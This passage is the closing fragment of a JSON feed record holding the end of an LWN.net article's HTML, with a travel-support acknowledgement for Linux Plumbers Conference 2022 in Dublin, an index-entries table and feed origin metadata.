would like to thank LWN subscribers for supporting my travel to Dublin\nfor Linux Plumbers Conference.]\n</p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/ConferenceIndex/\">Conference</a></td><td><a href=\"https://lwn.net/Archives/ConferenceIndex/#Linux_Plumbers_Conference-2022\">Linux Plumbers Conference/2022</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
}
]}
